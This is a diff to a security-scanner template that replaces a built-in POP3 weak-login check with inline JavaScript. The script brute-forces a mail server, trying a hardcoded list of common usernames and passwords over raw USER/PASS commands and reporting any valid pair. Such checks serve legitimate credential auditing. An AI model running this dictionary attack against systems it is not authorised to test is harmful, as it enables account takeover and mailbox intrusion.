@@ -6,7 +6,7 @@ info:
   severity: high
   verified: true
   description: |-
-    POP3 weak credentials were discovered (dictionary brute-force in go).
+    POP3 weak credentials were discovered (dictionary brute-force in javascript).
   tags: network,pop3,default-login,weak-login
   requires: [pop3]
   created: 2026/01/17
@@ -14,8 +14,73 @@ info:
 rules:
   r0:
     request:
-      type: go
-      data: pop3-weak-login
+      type: javascript
+      code: |
+        var net = require("afrog/net");
+
+        var port = /^[0-9]+$/.test(String(Port)) ? Port : "110";
+        var timeout = 3;
+        // 字典遍历的时间预算：避免慢目标把整个脚本拖到 -js-script-timeout 上限
+        var budget = 60000;
+
+        var usernames = ["admin", "administrator", "root", "test", "user", "webmaster", "info", "service", "mail"];
+        var passwords = ["123456", "password", "12345678", "admin", "root", "test", "12345", "webmaster", "123456789"];
+
+        // 返回 1 成功、0 失败、-1 连接失败
+        function attempt(user, pass) {
+          var c = net.TCPClient();
+          c.SetTimeout(timeout);
+          if (!c.Connect(Host, port)) return -1;
+
+          var banner = c.RecvUntil("\r\n");
+          if (banner.indexOf("+OK") !== 0) {
+            c.Close();
+            return 0;
+          }
+
+          c.Send("USER " + user + "\r\n");
+          var line = c.RecvUntil("\r\n");
+          if (line.indexOf("+OK") !== 0) {
+            c.Close();
+            return 0;
+          }
+
+          c.Send("PASS " + pass + "\r\n");
+          line = c.RecvUntil("\r\n");
+          c.Close();
+
+          return line.indexOf("+OK") === 0 ? 1 : 0;
+        }
+
+        var result = "";
+        var tried = 0;
+        var deadline = Date.now() + budget;
+
+        for (var i = 0; i < usernames.length && result === ""; i++) {
+          for (var j = 0; j < passwords.length && result === ""; j++) {
+            if (Date.now() > deadline) {
+              result = "fail;reason=timeout;tried=" + tried;
+              break;
+            }
+            tried++;
+            var r = attempt(usernames[i], passwords[j]);
+            if (r === -1) {
+              result = "fail;reason=connect_failed;tried=" + tried;
+              break;
+            }
+            if (r === 1) {
+              result = "success;user=" + usernames[i] + ";pass=" + passwords[j];
+            }
+          }
+        }
+
+        if (result === "") {
+          result = "fail;reason=not_found;tried=" + tried;
+        }
+        Export(result);
+      args:
+        Host: "{{Host}}"
+        Port: "{{Port}}"
     expression: response.raw.bcontains(b"success;")
     extractors:
       - type: regex
